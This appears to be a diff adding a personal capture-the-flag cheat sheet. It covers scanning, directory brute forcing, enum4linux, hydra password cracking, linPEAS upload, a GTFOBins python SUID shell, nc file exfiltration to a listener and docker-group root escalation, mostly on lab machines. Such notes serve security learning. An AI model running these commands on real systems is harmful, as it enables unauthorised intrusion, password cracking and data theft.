@@ -1,0 +1,90 @@
+Approach :
+
+
+for a given ip : 10.10.1.13
+
+***********************************************************************************************************************
+
+1) scanning : nmap -sC -sV -A <ip> | grep --open   #open list of ports 
+
+if port 80 opnen then must be an apache sevrer must be running  
+to check if what paths are available 
+
+***********************************************************************************************************************
+
+2) gobuster -w <wordlist> -u <url/ip> # req a world list and # ip 
+gobuster dir -u http://10.10.163.212 -w /usr/share/wordlists/dirb/common.txt  # /usr/share/wordlists/dirb/common.txt for gloabl wordlist
+
+gobuster dir -u http://10.10.225.240 -w /usr/share/wordlists/dirb/common.txt -x php,sh,css,txt,cgi,html,js,css,py
+
+
+***********************************************************************************************************************
+
+3) dir of /home/emu4linux/enumlinux.pl -a 10.10.1.13    #enumration to get more info about the apache server runing and also info about the user
+
+enum4linux -a 10.10.163.212   -- direct command to get the user and info
+
+***********************************************************************************************************************
+
+4) hydra -l user -P <wordlist>  (ftp/ssh/http)ssh://10.10.1.13     # to crack password by using hydra
+
+***********************************************************************************************************************
+
+ linPeas  # for privilages escalation 
+
+
+5) scp /home/linPeas.sh  jan@10.10.1.13:/dev/shm               # send sh file using ssh to dev/shm folder if you have the cred of a user 
+
+https://gtfobins.github.io/gtfobins/python/   if python is installed then using suid binary privilages can be escalated 
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+***********************************************************************************************************************
+For rockyou.txt wordlist 
+
+https://dekisoft.com/rockyou-txt-gz-password-list-download/
+
+1)locate rockyou
+2)cd /usr/share/wordlists/ 
+3) ls
+4) sudo gzip -d -rockyou.txt.gz
+5) cat rockyou.txt
+
+***********************************************************************************************************************
+
+etc/shadow file contains enc password of all users;
+
+***********************************************************************************************************************
+
+send file using nc :
+
+www-data@startup:/incidents$ nc 10.8.207.187 1234 < suspicious.pcapng
+nc 10.8.207.187 1234 < suspicious.pcapng
+
+──(leon㉿leo)-[~/thm_startup]
+└─$ nc -lnvp 1234 > capture.pcap                                                                     1 ⨯
+listening on [any] 1234 ...
+connect to [10.8.207.187] from (UNKNOWN) [10.10.84.238] 42422
+
+******************************************************************************************************************
+for docker :
+
+selena@pwned:~$ id
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+
+selena@pwned:~$ docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+privesc             latest              09ae39f0f8fc        16 months ago       88.3MB
+<none>              <none>              e13ad046d435        16 months ago       88.3MB
+alpine              latest              a24bb4013296        17 months ago       5.57MB
+debian              wheezy              10fcec6d95c4        2 years ago         88.3MB
+
+gtfobins :docker run -v /:/mnt --rm -it privesc chroot /mnt sh
+
+selena@pwned:~$ docker run -v /:/mnt --rm -it privesc chroot /mnt sh
+# cd root
+# ls
+proof.txt  root.txt
+# cat root.txt
+
+
